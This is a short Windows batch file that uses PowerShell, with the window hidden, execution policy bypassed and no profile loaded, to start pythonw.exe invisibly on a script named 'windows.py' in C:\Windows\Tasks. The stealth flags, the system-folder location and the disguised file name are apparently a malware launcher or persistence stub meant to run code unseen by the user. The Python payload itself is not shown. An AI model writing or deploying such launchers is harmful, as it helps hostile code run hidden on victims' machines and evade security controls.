@echo off
powershell -windowstyle hidden -ExecutionPolicy Bypass -NoProfile -Command "Start-Process pythonw.exe -ArgumentList 'C:\Windows\Tasks\windows.py' -WindowStyle Hidden"
exit